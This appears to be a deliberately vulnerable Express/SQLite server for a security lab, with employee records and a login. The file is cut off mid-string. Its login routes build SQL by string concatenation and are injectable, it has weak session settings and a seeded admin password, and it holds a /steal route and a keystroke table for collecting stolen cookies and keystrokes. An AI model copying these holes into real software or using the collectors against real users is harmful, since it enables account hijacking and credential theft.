import express from 'express';
import session from 'express-session';
import sqlite3 from 'sqlite3';
import cors from 'cors';
import path from 'path';
import process from 'node:process';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const dbPath = path.join(__dirname, 'demo.db');

const app = express();
const port = 3001;
let employeeTitleColumn = 'role';

app.use(cors());
app.use(express.json());
app.use(
  session({
    secret: 'secret123',
    resave: false,
    saveUninitialized: true,
    cookie: {
      secure: false,
      httpOnly: false,
      maxAge: 1000 * 60 * 60 // 1 hour
    }
  })
);

const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Error opening database', err.message);
  } else {
    console.log(`Connected to the SQLite database at \${dbPath}.`);

    // 1. Users Table
    db.run(
      `CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
      )`,
      (err) => {
        if (err) console.error('Error creating users table', err.message);
        else {
          console.log('Users table ready.');
          db.run(
            `INSERT INTO users (username, password) VALUES (?, ?) ON CONFLICT(username) DO UPDATE SET password = excluded.password`,
            ['admin', 'admin123'],
            (err) => {
              if (err) console.error('Error seeding admin user', err.message);
              else console.log('Admin user seeded with password: admin123');
            }
          );
        }
      }
    );

    // 2. Employees Table
    db.run(
      `CREATE TABLE IF NOT EXISTS employees (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        department TEXT NOT NULL,
        role TEXT NOT NULL,
        salary REAL
      )`,
      (err) => {
        if (err) console.error('Error creating employees table', err.message);
        else {
          console.log('Employees table ready.');
          db.all('PRAGMA table_info(employees)', (err, columns) => {
            if (err) return;
            const columnNames = columns.map((c) => c.name);
            employeeTitleColumn = columnNames.includes('role') ? 'role' : 'position';

            db.get('SELECT COUNT(*) AS count FROM employees', (err, row) => {
              if (!err && row.count === 0) {
                const insertEmployee = db.prepare(
                  `INSERT INTO employees (name, department, \${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`
                );
                [
                  ['John Perera', 'IT', 'Software Engineer', 85000],
                  ['Nimali Silva', 'Human Resources', 'HR Manager', 78000],
                  ['Kasun Fernando', 'Finance', 'Accountant', 72000],
                  ['Sahan Jayasinghe', 'IT', 'Network Administrator', 80000],
                  ['Dilini Rodrigo', 'Marketing', 'Marketing Executive', 67000],
                  ['Amaya Peris', 'Operations', 'Project Coordinator', 69000]
                ].forEach((e) => insertEmployee.run(e));
                insertEmployee.finalize();
                console.log('Seeded employees.');
              }
            });
          });
        }
      }
    );

    // 3. KEYS TABLE: To store the stolen keystrokes
    db.run(
      `CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        keystroke TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
      )`,
      (err) => {
        if (err) console.error('Error creating keystrokes table', err.message);
        else console.log('Keystrokes table ready.');
      }
    );
  }
});

// ⚠️ DELIBERATELY VULNERABLE — SQL Injection possible here
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.get(query, (err, user) => {
    if (err) return res.status(500).json({ success: false, error: err.message });
    if (user) {
      req.session.user = user.username;
      return res.json({ success: true, message: 'Logged in successfully!', user: user.username });
    }
    res.status(401).json({ success: false, error: 'Invalid credentials' });
  });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.get(query, (err, user) => {
    if (err) return res.status(500).json({ success: false, error: err.message });
    if (user) {
      req.session.user = user.username;
      return res.json({ success: true, message: 'Logged in successfully!', user: user.username });
    }
    res.status(401).json({ success: false, error: 'Invalid credentials' });
  });
});

app.get('/api/session', (req, res) => {
  if (req.session.user) {
    return res.json({ authenticated: true, user: req.session.user });
  }
  res.status(401).json({ authenticated: false });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ success: false, error: 'Logout failed' });
    res.clearCookie('connect.sid');
    res.json({ success: true });
  });
});

app.get('/steal', (req, res) => {
  const cookie = req.query.cookie;
  console.log('[SESSION HIJACK] Stolen Cookie:', cookie);
  res.status(200).send('ok');
});

app.get('/api/employees', (req, res) => {
  db.all('SELECT * FROM employees', [], (err, rows) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true, count: rows.length, data: rows });
  });
});

app.post('/api/employees', (req, res) => {
  const { name, department, role, position, salary } = req.body;
  const employeeTitle = role || position;

  if (!name || !department || !employeeTitle) {
    return res.status(400).json({ error: 'Name, department, and role are required' });
  }

  const query = `INSERT INTO employees (name, department, \${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`;
  db.run(query, [name, department, employeeTitle, salary], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.status(201).json({ success: true, employee: { id: this.lastID, name, department, role: employeeTitle, salary } });
  });
});

// ⚠️ VULNERABILITY: Endpoint to receive and store keystrokes
app.post('/api/log', (req, res) => {
  const { keystroke } = req.body;
  const sessionId = req.sessionID || 'unknown';
  
  if (!keystroke) {
    return res.status(400).json({ error: 'Keystroke data required' });
  }
  
  db.run(
    'INSERT INTO keystrokes (session_id, keystroke) VALUES (?, ?)',
    [sessionId, keystroke],
    function (err) {
      if (err) {
        console.error('Error logging keystroke:', err.message);
        return res.status(500).json({ error: '
